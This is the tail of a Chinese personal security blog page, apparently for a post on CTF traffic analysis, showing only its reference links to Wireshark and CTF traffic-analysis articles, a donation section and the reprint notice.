+<p>参考：<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489263&amp;idx=1&amp;sn=d9060114d924266ed2bdf4311ca030dd&source=41#wechat_redirect">CTF流量分析之wireshark使用</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489259&amp;idx=1&amp;sn=97faf012f2389dae08407309e3776dd5&source=41#wechat_redirect">CTF流量分析之题型深度解析</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/rS2KSmMIE2DpWKdYuzFdGg">CTF| 吃个鸡，一起破流量分析题吧！</a><br><a target="_blank" rel="noopener" href="https://skysec.top/2018/05/30/2018.5.5%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E9%A2%98%E8%A7%A3/#%E5%89%8D%E8%A8%80">2018年5月5日信息安全铁人三项赛数据赛题解</a></p>
+<h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭</p>
+<table>
+  <tbody>
+     <tr>
+         <td style="text-align:center;">支付宝支付</td>
+         <td style="text-align:center;">微信支付</td>
+     </tr>
+   <tr>
+    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
+      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
+  </tr>
+</tbody></table>
+
+
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://jwt1399.top" rel="external nofollow noreferrer">简简</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://jwt1399.top/posts/29176.html">https://jwt1399.top/posts/29176.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://jwt1399.top" target="_blank">简简</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+                                    <span class="chip bg-color">流量分析</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,linkedin,facebook,twitter,google,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">打</a>
+	<a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        /*max-width: 100%;*/
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+    .v[data-class=v] .vinput {
+     padding: 0px 0px;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论<center>填上邮箱会收到评论回复提醒哦!!!</center></span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/valine/1.4.18/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'Awf92dhT3VWqTfENqbCDoqbA-gzGzoHsz',
+        appKey: '9uN7ODvigK9GAp8CYBz0fOrX',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: '',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '[填上邮箱，会给你发送评论提醒]，ヾﾉ≧∀≦)o 请畅所欲言~',
+        enableQQ: true,
+        boolean: true,
+    });
+</script>
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/posts/49445.html">
+                    <div class="card-image">
+                        
+                        <img src="https://img.jwt1399.top//img/20200824182154.jpg" class="responsive-img" alt="渗透测试-工具篇">
+                        
+                        <span class="card-title">渗透测试-工具篇</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+dirsearch-网站目录结构扫描器
+dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。
+
+安装与使用#安装：
+git clone https://github.com/maurosor
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-08-06
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Tools/" class="post-category">
+                                    Tools
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/linuxbasic.html">
+                    <div class="card-image">
+                        
+                        <img src="https://img.jwt1399.top//img/20200824183627.jpg" class="responsive-img" alt="Linux 学习笔记">
+                        
+                        <span class="card-title">Linux 学习笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前言由于平常做CTF题经常会用到kali linux，但是作为安全小萌新的我，对linux简直是一无所知，惊羡于大佬仅用几条命令就能实现各种操作，于是乎我的linux学习之路就此开始。
+2020.2.24更新：由于本专业开设了《Linux操
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-07-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CS%E5%9F%BA%E7%A1%80/" class="post-category">
+                                    CS基础
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Linux/">
+                        <span class="chip bg-color">Linux</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('100')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 简言之<br />'
+            + '文章作者: 简简<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('2'),
+            headingSelector: 'h1, h2, h3, h4, h5, h6'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5, h6').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="https://jwt1399.top" target="_blank">简简</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>&nbsp;|
+
+			<!-- <span>为♥️️发电</span> -->
+            <a target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral"><img no-lazy src="https://img.jwt1399.top/img/20200824181422.png" style="width: 47px; vertical-align: middle;" ></a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">697.8k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "7";
+                    var startDate = "2";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            <a href="https://search.google.com/search-console?resource_id=http%3A%2F%2Fjwt1399.top%2F" target="_blank"
+                rel="nofollow noopener">谷歌统计</a>&nbsp;|
+            
+            <span id="icp"><img no-lazy src="/medias/icp.png" style="vertical-align: text-bottom;" />
+                <a href="http://www.beian.miit.gov.cn/" target="_blank">蜀ICP备19020450号</a>
+            </span>
+            |
+            
+            <a href="https://tongji.baidu.com/web/10000159136/overview/index?siteId=14519996" target="_blank"
+                rel="nofollow noopener">百度统计</a>
+
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+    <a href="https://jwt1399.top/baidusitemap.xml" class="tooltipped" target="_blank" data-tooltip="访问我的sitemap" data-position="top" data-delay="50">
+        <i class="fas fa-sitemap"></i>
+    </a>
+
+
+    <a href="https://pl.jwt1399.top" class="tooltipped" target="_blank" data-tooltip="valine评论: https://pl.jwt1399.top" data-position="top" data-delay="50">
+        <i class="fab fa-optin-monster"></i>
+    </a>
+
+
+    <a href="mailto:1019084218@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1019084218" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1019084218" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.json", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.staticfile.org/aos/3.0.0-beta.6/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+	<!--valine_人机验证-->
+	<button id="TencentCaptcha"data-appid="2046265119"data-cbfn="callback"type="button" hidden></button>
+	
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-160042502-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-160042502-1');
+</script>
+
+
+    <!-- Baidu Analytics -->
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?0e306ce3426983ae6367d094d39f1190";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+    
+    <script type="text/javascript" size="150" alpha='0.6'
+        zIndex="-1" src="/libs/background/ribbon.min.js" async="async"></script>
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+        
+</body>
+
+</html>
